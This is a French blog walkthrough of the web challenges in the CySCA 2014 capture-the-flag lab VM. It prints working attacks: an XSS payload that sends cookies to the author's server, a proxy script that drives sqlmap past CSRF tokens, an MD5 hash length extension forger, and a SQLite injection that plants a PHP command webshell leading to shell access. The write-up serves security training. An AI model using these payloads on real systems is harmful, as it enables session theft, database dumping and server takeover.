# Solution du Cyber-Security Challenge Australia 2014 (partie web)

Et bien tu viens plus aux soirées ?
-----------------------------------

Mais si, mais si... Ces derniers temps je me suis penché sur le *CTF CySCA 2014*.  

Le *CySCA* ça signifie *Cyber Security Challenge Australia*. C'est un challenge national sponsorisé entre autres par le gouvernement australien, *Microsoft* et des sociétés australiennes.  

Les organisateurs ont eu la bonne idée d'en faire une image virtuelle comme ça chacun peut s'y exercer alors que le challenge a officiellement fermé ses portes.  

On peut notamment récupérer la machine virtuelle VMWare [sur *VulnHub*](https://www.vulnhub.com/entry/cysca-cysca2014-in-a-box,94/).  

Le challenge est énorme est une fois la VM mise en place on accède à un site sur le port 80 qui donne les missions à réaliser organisées par thématiques.  

On trouve ainsi l'exploitation d'applications web, de l'inforensique *Androïd*, de la rétro-ingénierie, de la crypto, de la recherche de vulnérabilités et création d'exploit, de l'écriture de shellcode, de l'inforensique réseau, de la programmation et enfin une catégorie baptisée *Random* qui rassemble vraisemblablement des exercices que les organisateurs ne sont pas parvenus à catégoriser.  

Bref du lourd, du très très lourd (pour paraphraser [Michel](http://www.allocine.fr/video/programme-12284/))  

J'ai décidé pour réduire de me concentrer uniquement sur la partie web (mis à part un exercice de programmation que j'ai fait dans la foulée). Chaque partie de l'article correspond au nom de l'exercice. A chaque fois il faut récupérer un flag (hé oui, c'est un CTF). C'est parti.  

Club Status (80 points)
-----------------------

On dispose de l'indication suivante :  

> Only VIP and registered users are allowed to view the Blog. Become VIP to gain access to the Blog to reveal the hidden flag.

A l'adresse */index.php* on trouve une série de liens en haut de page. Le lien *"Blog"* est grisé et en regardant la source on remarque qu'il n'y a pas de lien pour cette section.  

Si on demande */blog.php* on est redirigé vers la page de login.  

Avec l'extension de navigateur *Chrome* *EditThisCookie* on voit très facilement qu'un cookie nommé *vip* est défini à la valeur 0.  

On change cette valeur à 1, on recharge la page et hop... l'accès au blog est possible et nous révèle le flag *ComplexKillingInverse411*. Court et facile.  

![EditThisCookie VIP](https://raw.githubusercontent.com/devl00p/blog/master/images/cysca_vip.png)

Om nom nom nom (160 points)
---------------------------

Objectif : *Gain access to the Blog as a registered user to reveal the hidden flag.*

Sur le blog on trouve différents billets dont un faisant référence à une API REST à l'adresse */api/documents*. On y reviendra plus tard...  

En suivant les pages du site cela m'a permis d'énumérer des utilisateurs possibles et de lancer une attaque force brute sur le formulaire de login... mais sans résultat.  

J'ai aussi remarqué que l'accès à la page de déconnexion provoque (même si l'on n'est pas connecté) les changements suivants sur les cookies :  

```plain
Set-Cookie:user=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
Set-Cookie:remember=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
Set-Cookie:activity=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT
```

Je n'ai rien trouvé à ce niveau toutefois à force de tentatives j'ai fini par remarquer l'indication suivante pour l'un des articles du blog :  

> on 11th February 2014 by Sycamore (who last viewed this 57 seconds ago)

Une tâche planifiée semble ainsi simuler la présence de l'utilisateur *Sycamore* qui va sur l'article en question à intervalle régulier.  

Le mécanisme de commentaires en bas de chaque article permet d'envoyer des commentaires sans authentification. A première vue il semble protégé contre les attaques XSS. Sauf qu'une indication nous explique comment poster des liens :  

> Links can be added with [Link title](http://example.com)

Le mécanisme BBcode-like nous permet de passer outre le filtrage des caractères. Ainsi j'ai pu poster le commentaire suivant :  

```plain
[<script src=http://192.168.1.3/test.js></script>](test)
```

Et le javascript est bien interprété. Dans le script *test.js* placé sur un serveur local j'ai mis le contenu suivant :  

```javascript
var image = document.createElement('img');
image.src = "http://192.168.1.3/" + document.cookie;
document.body.appendChild(image);
```

Un navigateur moderne bloquerait sans doute l'utilisation de *document.cookie* dans un cas comme celui-ci mais ici j'ai rapidement reçu des lignes de ce type dans les logs de mon serveur *Apache* :  

```plain
"GET /PHPSESSID=64pcr2a2hd583eqg579gpvrcs4;%20vip=0 HTTP/1.1" 403 - "http://localhost/blog.php?view=2" "
Mozilla/5.0 (Unknown; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.7 Safari/534.34"
```

On voit ici l'utilisation de *PhantomJS*, un browser headless. On remarque surtout que l'exploitation a réussie.  

Dès lors il suffit d'éditer PHPSESSID via *EditThisCookie* et de mettre la valeur récupérée.  

*User Flag: OrganicShantyAbsent505*  

Nonce-sense (220 points)
------------------------

La mission : récupérer le flag stocké dans la base de données.  

Quand on est connecté en tant que *Sycamore* on remarque une icône de poubelle à côté de chaque commentaire. Quand on affiche le code HTML on voit que le mécanisme de suppression se fait via une requête vers *deletecomment.php* utilisant *jQuery* :  

```plain
window.csrf = '27fb15c0f098a858';
function deletecomment(obj, id) {
  $.post('/deletecomment.php', {csrf: window.csrf, comment_id: id}).done(function(data) {
    if (data['result']) {
      $(obj).parent().remove();
      window.csrf = data['csrf'];
    }
  });
}
```

Le script PHP prend deux variables : l'ID du commentaire ainsi qu'un token anti cross-site-scripting (ce serait trop facile sinon).  

Émettre une requête HTTP avec un token valide permet de s'assurer rapidement que le script est vulnérable à une faille d'injection SQL.  

Toutefois la présence de la protection anti-CSRF rend l'attaque non-automatisable par un outil d'attaque comme *sqlmap*... à moins de lui donner un coup de main ;-)  

Pour cela j'ai eu recours à la librairie Python [libmproxy]( http://mitmproxy.org/) : *A library for implementing powerful interception proxies*.  

La documentation est succincte mais grâce à l'introspection offerte par Python on parvient assez facilement à ses fins.  

Au final j'ai écrit le proxy interceptant suivant :  

```python
from libmproxy import controller, proxy, flow
import sys
import requests
import json

class StickyMaster(controller.Master):
    def __init__(self, server):
        controller.Master.__init__(self, server)
        self.current_csrf = None
        self.cookie = "vip=1; PHPSESSID=dt4k9fnq54ut6ndm78of7rm053;"

        r = requests.get("http://192.168.1.64/blog.php?view=1",
                headers={"Cookie": self.cookie})

        if "window.csrf = '" in r.content:
            start = r.content.find("window.csrf = '") + 15
            end = start + 20
            self.current_csrf = r.content[start:end].split("'", 1)[0]
            print "First csrf value =", self.current_csrf
        else:
            print "Can't get first csrf value :'("
            sys.exit()

    def run(self):
        try:
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()

    def handle_request(self, msg):
        if msg.method == "POST":
            msg.headers["cookie"] = [self.cookie]
            params = msg.get_form_urlencoded()
            params['csrf'] = [self.current_csrf]
            msg.set_form_urlencoded(params)
        msg.reply()

    def handle_response(self, msg):
        if '"csrf"' in msg.content:
            d = json.loads(msg.content)
            self.current_csrf = d["csrf"]
            print "Changing csrf value for", self.current_csrf
        msg.reply()

config = proxy.ProxyConfig()
server = proxy.ProxyServer(config, 3128)
m = StickyMaster(server)
m.run()
```

Il s'initialise en se connectant au site via un cookie volé pour récupérer un premier jeton CSRF valide.  

Ensuite le proxy intercepte les requêtes POST pour à mettre un token CSRF valide.  

Le proxy récupère aussi la réponse du serveur cible car lors d'une requête de suppression la réponse contient aussi une nouvelle valeur pour le token anti-csrf (ce qui réduit ainsi le nombre de requêtes à passer).  

Il est alors possible de lancer *sqlmap* en le faisant parler à notre proxy :  

```plain
./sqlmap.py -u http://192.168.1.64/deletecomment.php  --data="comment_id=*&csrf=plop" --proxy=http://127.0.0.1:3128/

    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:03:41

custom injection marking character ('*') found in option '--data'. Do you want to process it? [Y/n/q] Y
[17:03:43] [INFO] testing connection to the target URL
[17:03:43] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
[17:03:43] [INFO] testing if the target URL is stable. This can take a couple of seconds
[17:03:44] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on                                                                                                                        
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
[17:04:04] [INFO] searching for dynamic content
[17:04:04] [INFO] dynamic content marked for removal (1 region)
[17:04:04] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[17:04:04] [INFO] confirming that (custom) POST parameter '#1*' is dynamic
--- snip ---
[17:04:37] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'
[17:05:37] [INFO] (custom) POST parameter '#1*' seems to be 'MySQL > 5.0.11 OR time-based blind' injectable 
--- snip ---
sqlmap identified the following injection points with a total of 107 HTTP(s) requests:
---
Place: (custom) POST
Parameter: #1*
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause
    Payload: comment_id=-9267 OR (SELECT 4557 FROM(SELECT COUNT(*),CONCAT(0x71786c6871,(SELECT (CASE WHEN (4557=4557) THEN 1 ELSE 0 END)),0x71687a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&csrf=plop

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 OR time-based blind
    Payload: comment_id=-2919 OR 3325=SLEEP(5)&csrf=plop
---
[17:08:18] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 13.04 or 12.04 or 12.10 (Raring Ringtail or Precise Pangolin or Quantal Quetzal)
web application technology: Apache 2.2.22, PHP 5.3.10
back-end DBMS: MySQL 5.0
```

Une fois que *sqlmap* a détecté la méthode d'injection il suffit de le relancer en spécifiant les actions qui nous intéressent (ici dumper les infos de la base). Je vous renvoie à d'autres articles de CTF sur mon blog pour plus d'information.  

On obtient alors les informations suivantes (en vrac) :  

```plain
current database:    'cysca'
current user:    'cysca@localhost'

[5 tables]
+--------------+
| user         |
| blogs        |
| comments     |
| flag         |
| rest_api_log |
+--------------+

Table: rest_api_log
+--+------+-----------------------------------------------------------------------------------------------------------------------------------+------------------+----------------+-----------------------------+
|id|method| params                                                                                                                            | api_key          | created_on     | request_uri                 
+--+------+-----------------------------------------------------------------------------------------------------------------------------------+------------------+----------------+-----------------------------+
| 1| POST | contenttype=application%2Fpdf&filepath=.%2Fdocuments%2FTop_4_Mitigations.pdf&api_sig=235aca08775a2070642013200d70097a             | b32GjABvSf1Eiqry | 02-21 09:27:20 | \\/api\\/documents          |
| 2| GET  | _url=%2Fdocuments&id=2                                                                                                            | NULL             | 02-21 11:47:01 | \\/api\\/documents\\/id\\/2 |
| 3| POST | contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest-api.txt&api_sig=95a0e7dbe06fb7b77b6a1980e2d0ad7d                           | b32GjABvSf1Eiqry | 02-21 11:54:31 | \\/api\\/documents          |
| 4| PUT  | _url=%2Fdocuments&id=3&contenttype=text%2Fplain&filepath=.%2Fdocuments%2Frest-api-v2.txt&api_sig=6854c04381284dac9970625820a8d32b | b32GjABvSf1Eiqry | 02-21 12:07:43 | \\/api\\/documents\\/id\\/3 |

Table: flag
+----------------------+
| flag                 |
+----------------------+
| CeramicDrunkSound667 |
+----------------------+

Table: user
+----+------+------------------------------+------------+----------------------------------+-----------+------------+
| id | salt | email                        | created    | password                         | last_name | first_name |
+----+------+------------------------------+------------+----------------------------------+-----------+------------+
| 1  | 5a7  | syc.burns@fortcerts.cysca    | 2013-03-04 | 1de5a5a2f0e85bda8ab7d0b85073435a | Burns     | Sycamore   |
| 2  | 9fc  | sar.burns@fortcerts.cysca    | 2013-04-16 | c785e6590d03c89fb9e54e9b18ee3cf4 | Burns     | Sarah      |
| 3  | 8d5  | kev.saunders@fortcerts.cysca | 2013-05-15 | 1eebae2bd335349adf3959ad33b58dc5 | Saunders  | Kevin      |
+----+------+------------------------------+------------+----------------------------------+-----------+------------+
```

Hypertextension (260 points)
----------------------------

Cette fois l'objectif est d'attraper le flag en obtenant un accès au panel de cache.  

L'utilisation de *DirBuster* ou du module *mod\_negotiation\_brute* de *Metasploit* nous apprend rapidement qu'il y a un script *cache.php* à la racine. Si on tente d'y accéder on est bêtement redirigés vers l'index (l'espoir fait vivre).  

On a tout de même récupéré une information essentielle dans la précédente attaque : une clé d'API.  

Les requêtes de modification sur l'API doivent être signées de cette façon :  

```plain
All API calls using an authentication token must be signed and contain a X-Auth header with your api_key e.g. X-Auth: <api_key>.
This will include all calls that modify content i.e. POST/PUT/DELETE methods.

The process of signing is as follows.
- Sort your argument list into alphabetical order based on the parameter name. e.g. foo=1, bar=2, baz=3 sorts to bar=2, baz=3, foo=1
- concatenate the shared secret and argument name-value pairs. e.g. SECRETbar2baz3foo1
- calculate the md5() hash of this string
- append this value to the argument list with the name api_sig, in hexidecimal string form. e.g. api_sig=1f3870be274f6c49b3e31a0c6728957f
```

Ici nous disposons bien de la clé d'API mais pas du secret partagé... L'exploitation semble donc impossible.  

On est ici toutefois dans une situation bien particulière :  

* on connait par les logs des données en clair qui ont été envoyées.
* pour ces données envoyées on dispose de la signature qui a été générée.
* le secret partagé est situé au début des données et non à la fin.

Dès lors il est possible de procéder à une *hash length extension attack*. [*SkullSecurity* a écrit un très bon article](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) sur ce sujet que j'avais d'abord découvert sur le CTF web de *Stripe*.  

D'ailleurs le *CySCA 2014* a montré quelques similitudes avec cet autre CTF. Ici l'une des différences est que l'algo de hashage est MD5 et non SHA1.  

Sur le *Stripe* il avait suffit d'utiliser [un outil tout fait](https://gist.github.com/philfreo/3873715) écrit par *vnsecurity*.  

Ici j'ai décidé d'approfondir et d'écrire l'outil d'attaque moi même pour mieux comprendre cette attaque.  

Globalement l'idée est que l'on puisse reprendre un hashage de données là où il en était. En programmation (comme avec la librairie *hashlib* de Python) on utilise habituellement une méthode *update* qui permet de reprendre le hashage.  

Ici c'est légèrement différent car pour se faciliter les calculs on *"arrondi"* en quelque sorte le statut de chiffrement à la taille du bloc utilisé par l'algorithme (tel que cela aurait pu être fait avec un langage comme le C).  

Grace à la taille des données en clair que l'on connait (plus ou moins) et la signature correspondante on peut ainsi recréer l'état cryptographique et y ajouter des données afin de générer une nouvelle signature valide (si ce n'est pas clair, je vous invite à lire l'article cité avant).  

Il reste tout de même deux problématiques :  

* on ne connait pas la taille du secret partagé
* il faut trouver quoi rajouter et comment s'y prendre

Pour le premier problème j'ai eu recours à l'outil *hash\_extender* de *SkullSecurity* et j'ai bêtement testé différentes longueurs pour le secret partagé.  

Voici un exemple d'utilisation :  

```plain
$ ./hash_extender -d contenttypeapplication/pdffilepath./documents/Top_4_Mitigations.pdf -s 235aca08775a2070642013200d70097a -f md5 -a /../../../../../../../etc/passwd -l 16
Type: md5
Secret length: 16
New signature: a7311b7d7a12b28ff48e9414141ebb07
New string: 636f6e74656e74747970656170706c69636174696f6e2f70646666696c65706174682e2f646f63756d656e74732f546f705f345f4d697469676174696f6e732e7064668000000000000000000000000000000000000000000000000000000000000000000000000098020000000000002f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f2e2e2f6574632f706173737764
```

Là où c'est laborieux c'est qu'il faut reprendre ces infos pour les placer par exemple dans un script Python de cette forme pour émettre la requête :  

```python
import requests
import hashlib
import urllib

hdrs = {
    "Cookie": "vip=1",
    "X-Auth": "b32GjABvSf1Eiqry",
    "Content-Type": "application/x-www-form-urlencoded"
    }

contenttype = "application%2Fpdf"
filepath = "./documents/Top_4_Mitigations.pdf"
filepath += "%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00"
filepath += "%00%00%00%00%00%00%00%00%00%00%98%02%00%00%00%00%00%00/../../../../../../../etc/passwd"

filepath = filepath.replace('/', '%2F')

api_sig = "a7311b7d7a12b28ff48e9414141ebb07"

payload = "contenttype={0}&filepath={1}&api_sig={2}".format(contenttype, filepath, api_sig)
sess = requests.session()
r = sess.post("http://192.168.1.64/api/documents",
        headers=hdrs,
        data=payload)

print r.content
```

Avec une taille de secret partagée inférieure à 16 on obtenait *{"error":"API signature failed."}* alors qu'avec une longueur de 16 on reçoit *{"error":"File path does not exist"}*.  

Pour ce qui est du second problème il n'est malheureusement pas possible de remonter l'arborescence en rajoutant un chemin à la fin du *filepath* :-(. Normalement Linux et PHP permettent de rentrer dans des dossiers qui n'existent pas pour les remonter ensuite... Sauf que le script PHP doit faire une vérification à l'aide de la fonction *file\_exists()* qui ne semble pas possible de berner.  

De la même façon placer un second argument *filepath* avec une valeur différente ne fonctionne pas mieux. La signature ainsi générée n'est plus valide.  

La solution à ce problème est liée à la façon dont l'API retire les caractères *=* et *&* de la querystring pour obtenir les données à hasher. C'est à dire que la chaîne *response=42* donnera la même signature qu'avec *resp=onse42*.
Ainsi on peut faire en sorte que le script PHP du serveur calcule toujours la même signature mais au moment de lire la variable dans *$\_POST* il ne l'aura pas... à moins qu'on lui en donne une supplémentaire avec une signature valide.  

Pour automatiser l'attaque j'ai eu recours à une librairie MD5 100% Python [trouvée sur pastebin](http://pastebin.com/tvFbSQSG) que j'ai renommé *puremd5* dans le script suivant que j'ai écrit :  

```python
import puremd5
import struct
import hashlib
import urllib
import requests
import sys

hdrs = {
    "Cookie": "vip=1",
    "X-Auth": "b32GjABvSf1Eiqry",
    "Content-Type": "application/x-www-form-urlencoded"
    }

data = "contenttypeapplication/pdffilepath./documents/Top_4_Mitigations.pdf"
append = "filepath" + sys.argv[1]

length_secret = 16
length_data = len(data)
secret = "A" * length_secret

count = (length_secret + length_data) * 8

# We save some space for the length of data (8 bytes) plus the 0x80 byte
null_count = 64 - ((length_secret + length_data + 9) % 64)
padding = "\x80" + ("\0" * null_count)

# new_data will be length-multiple of 64
new_data = secret + data + padding + struct.pack("Q", count)

base_signature = "235aca08775a2070642013200d70097a"
#print "Base signature      ", base_signature
A, B, C, D = struct.unpack("IIII", base_signature.decode("hex_codec"))

m = puremd5.MD5()
m.update("A" * len(new_data))
m.A = A
m.B = B
m.C = C
m.D = D
m.update(append)
new_signature = m.hexdigest()
#print "Calculated signature", new_signature

added = urllib.quote(padding + struct.pack("Q", count))
added += "&filepath=" + urllib.quote_plus(sys.argv[1])

post_data = "contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf"
post_data += added
post_data += "&api_sig=" + new_signature
print post_data

sess = requests.session()
r = sess.post("http://192.168.1.64/api/documents",
        headers=hdrs,
        data=post_data)

#print r.headers
print r.content
```

Le script utilise l'API en POST permettant de rendre public un document déjà présent sur le serveur. On utilise le script de cette façon :  

```plain
$ python arg_ownhash.py index.php
contenttype=application%2Fpdf&f=ilepath.%2Fdocuments%2FTop_4_Mitigations.pdf%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%02%00%00%00%00%00%00&filepath=index.php&api_sig=529d58265e28414a5f5095c253ea5e31
{"id":"4","uri":"\/api\/documents\/id\/4"}
```

Il n'y a alors qu'à taper l'adresse */api/documents/id/4* et récupérer la source PHP de la page d'index. Ensuite il faut faire pareil avec les autres scripts PHP.  

Le fichier *cache.php* commence par ces lignes de code :  

```php
$flag = 'OrganicPamperSenator877';
if ($_GET['access'] != md5($flag)) {
  header('Location: /index.php');
  die();
}
```

Injeption (280 points)
----------------------

L'objectif est ici de récupérer le fichier *flag.txt* à la racine du système du fichier.  

Si l'on tente de réutiliser le script précédent pour remonter l'arborescence de plus d'un niveau on obtient un message d'erreur informant que l'on ne peut pas quitter */var/www*.  

Il faut donc se plonger dans les méandres du système de cache du site.  

On remarque que la page d'index permet de récupérer une page en cache si on passe un paramètre *debug* :  

```php
<?php
// Not in production... see /cache.php?access=<secret>
include('../lib/caching.php');
if (isset($_GET['debug'])) {
  readFromCache();
}
```

La fonction *readFromCache* de *caching.php* est la suivante :  

```php
/**
 * Reads the cache from the db and displays it
 * Returns false is not found in cache
 */
function readFromCache() {
  $key = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);

  $db = new CacheDb();
  if (($data = $db->getCache($key)) !== false) {
    echo $data;
    exit();
  }
}
```

Elle concatène donc l'hôte avec l'URI demandée (ce qui donner par exemple *server.tld/page?id=1*). La somme MD5 de cette chaîne celle alors de clé pour retrouver des données en cache depuis une base *SQLite*.  

```php
  public function __construct() {
    $this->conn = new PDO('sqlite:../db/cache.db');
  }

  public function getCache($key) {
    $query = "SELECT data FROM cache WHERE uri_key='$key'";

    $result = $this->conn->query($query); 
    return $result->fetchColumn();    
  }
```

Notez que le cache est vide par défaut et sa récupération est donc sans intérêts.  

Par contre il y a un point intéressant dont tout le monde n'est pas forcément au courant : la variable PHP *$\_SERVER['HTTP\_HOST']* ne vient pas par magie d'un fichier de configuration quelconque.  

Le *HTTP\_HOST* est en réalité repris directement depuis l'entête *Host* envoyé dans la requête HTTP donc contrôlable par un attaquant.  

Pour ce qui est de la mise en cache, le cheminement commence par le panel d'administration du cache (*cache.php*).  

Ce script dispose d'un formulaire permettant de spécifier une URL et un titre.  

Le code principal est le suivant :  

```php
$errors = array();
if (!empty($_POST)) {
  if (!isset($_POST['title'])) {
    $errors[] = 'Missing title';    
  } else {
    if (strlen($_POST['title']) > 40) {
      $errors[] = 'Title cannot exceed 40 characters';
    }
  }

  if (!isset($_POST['uri'])) {
    $errors[] = 'Missing URI';
  }

  if (empty($errors)) {
    try {
      cachePage($_POST['uri'], $_POST['title']);      
    } catch (Exception $ex) {
      $errors[] = $ex->getMessage();
    }
  }
}
```

Déjà le titre est limité à 40 caractères. Ensuite la méthode *cachePage* est appelée avec l'URL et le titre postés sous notre contrôle.  

Voici la fonction *cachePage* :  

```php
function cachePage($uri, $title) {
  if (!($parseUrl = parse_url($uri))) {
    throw new Exception('Malformed URI');
  }

  if ($parseUrl['scheme'] != 'http') {
    throw new Exception('Only http scheme is allowed');
  }

  if ($parseUrl['host'] != $_SERVER['SERVER_NAME'] && $parseUrl['host'] != $_SERVER['SERVER_ADDR']) {
    throw new Exception('Remote hosts are not allowed');
  }

  if (!($data = file_get_contents($uri))) {
    throw new Exception('Failed to load URI');
  }

  $key = md5($parseUrl['host']
          . (isset($parseUrl['path']) ? $parseUrl['path'] : '') 
          . (isset($parseUrl['query']) ? '?'.$parseUrl['query'] : ''));

  $db = new CacheDb();
  $db->setCache($key, $title, urlencode($uri), $data);
}
```

Ici l'URL est parsée et il est vérifié que le protocole spécifié est http. Par conséquent impossible de passer un *file://* sans être détecté.  

Ensuite l'hôte spécifié dans l'URL doit correspondre à l'hôte du serveur du challenge... sauf que comme pour *HTTP\_HOST* précédemment on a le contrôle sur ces variables si on forge une requête nous même.  

Enfin après ces vérifications un hash MD5 est calculé de la même façon est utilisé pour appeler *setCache*.  

L'URL est aussi passée à la fonction mais encodée... En fin de compte on a de véritable contrôle que sur *$title* (limité à 40 caractères) et... *$data* car on peut jouer avec HTTP pour forcer le système de cache à lire le contenu d'une adresse nous appartenant.  

Pour en finir avec le code PHP voici la fonction *setCache* :  

```php
  public function setCache($key, $title, $uri, $data) {
    $query = "INSERT INTO cache VALUES ('$title', '$key', '$uri', '$data', datetime('now'))";

    if (!($this->conn->exec($query))) {
      $error = $this->conn->errorInfo();
      throw new Exception($error[2]);
    }

    return $this->conn->lastInsertId();    
  }
```

Cette fonction est vulnérable à une injection *SQLite* :-) La longueur de *$title* rend l'attaque impraticable par ce vecteur mais via *$data* on dispose d'autant de place que nécessaire.  

[Un article](http://atta.cked.me/home/sqlite3injectioncheatsheet) présent sur le web décrit une technique d'injection *SQLite* permettant de provoquer la création d'un fichier sur le serveur.  

L'idée est de pouvoir générer la requête suivante avec injection :  

INSERT INTO CACHE VALUES ('t', 'k', 'u', '**', DATETIME('NOW')); ATTACH DATABASE '/var/www/backdoor.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<? system($\_GET["cmd"]); ?>');--**', DATETIME('NOW'))  

Pour cela il suffit de placer la partie en rouge dans un fichier *req.txt* sur un serveur web à nous puis de forger une requête avec comme *Host* l'adresse IP de notre serveur :  

```python
import requests

host = "192.168.1.3"

d = {"title": "t", "uri": "http://192.168.1.3/req.txt"}

hdrs = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": host
        }

r = requests.post("http://192.168.1.64/cache.php?access=f4fa5dc42fd0b12a098fcc218059e061",
        data=d,
        headers=hdrs)

print r.status_code, r.reason
print r.content
```

Et cela... n'a pas fonctionné car */var/www* ne correspondait finalement pas au *DocumentRoot*. J'ai testé différents sous-dossiers avant de me rendre compte qu'en utilisant simplement un nom de fichier (sans path) ça écrivait dans le même dossier que *cache.php* (donc à la vrai racine web).  

Avec la backdoor PHP ainsi placée on pouvait alors facilement mettre en place un *tshd* et accéder ensuite au serveur :  

```plain
$ ./tsh 192.168.1.64
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ bash
www-data@misc:/var/www/src$ ls
api.php  backdoor.php  blog.php  cache.php  css  deletecomment.php  documents  favicon.ico  fonts  img  index.html  index.php  js  login.php  logout.php
www-data@misc:/var/www/src$ cd ..
www-data@misc:/var/www$ ls
casper.js  db  lib  release  src
www-data@misc:/var/www$ cd / 
www-data@misc:/$ ls
bin  boot  challenges  chroots  dev  etc  flag.txt  home  initrd.img  lib  lost+found  media  mnt  opt  proc  root  run  sbin  selinux  srv  sys  tmp  usr  var  vmlinuz
www-data@misc:/$ cat flag.txt
Flag: TryingCrampFibrous963
```

Elle est pas belle la vie ?

*Published November 18 2014 at 22:11*